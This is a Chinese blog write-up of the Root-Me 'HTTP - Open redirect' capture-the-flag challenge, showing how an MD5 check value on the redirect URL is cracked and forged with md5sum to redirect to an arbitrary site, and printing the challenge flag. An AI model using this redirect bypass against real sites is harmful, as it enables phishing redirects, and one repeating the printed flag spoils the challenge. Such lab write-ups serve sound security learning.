<!--yml
category: 未分类
date: 2022-04-26 14:42:59
-->

# CTF-rootme 题解之HTTP - Open redirect_weixin_30952535的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_30952535/article/details/99600334](https://blog.csdn.net/weixin_30952535/article/details/99600334)

LINK:[https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect)

　　  [http:challenge01.root-me.org/web-serveur/ch52/](challenge01.root-me.org/web-serveur/ch52/%20)

Reference:[https://github.com/zayzayzayzay/root-me-4/tree/master/Web-Server](https://github.com/zayzayzayzay/root-me-4/tree/master/Web-Server)

　　　　   [https://github.com/yelynn1/Root-me/blob/master/Web_server.md](https://github.com/yelynn1/Root-me/blob/master/Web_server.md)

在目标网页空白处右击查看源代码得到关键信息如下：

```
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
        <h1>Social Networks</h1>
<a href='?url=**https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'**>facebook</a>
<a href='?url=**https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0**'>twitter</a>
<a href='?url=**https://slack.com&h=e52dc719664ead63be3d5066c135b6da**'>slack</a>
<style type="text/css"> 
```

 其中&h=参数为md5加密的值，在线破解未果，使用BlackArch内置程序hash-buster可以破解，确定该hash值即为网址的加密结果。

```
[ BlackArch burpsuite ]# hash-buster -s e52dc719664ead63be3d5066c135b6da
_  _ ____ ____ _  _    ___  _  _ ____ ___ ____ ____
|__| |__| [__  |__|    |__] |  | [__   |  |___ |__/
|  | |  | ___] |  |    |__] |__| ___]  |  |___ |  \  v3.0

[!] Hash function : MD5
https://slack.com

```

 构造链接过程如下:

```
[ BlackArch burpsuite ]# echo -n 'https://baidu.com'|md5sum|awk '{print $1}'
bb6e082d5c360ce6a0c64f926feea905

```

 链接地址为：http://challenge01.root-me.org/web-serveur/ch52/?url=https://baidu.com&h=bb6e082d5c360ce6a0c64f926feea905,直接访问会瞬间跳转，

可以使用查看源代码链接**view-source:**http://challenge01.root-me.org/web-serveur/ch52/?url=https://baidu.com&h=bb6e082d5c360ce6a0c64f926feea905

得到flag为**e6f8a530811d5a479812d7b82fc1a5c5**。

```
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
        <p>Well done, the flag is **e6f8a530811d5a479812d7b82fc1a5c5**</p><script>document.location = 'https://baidu.com';</script> 
```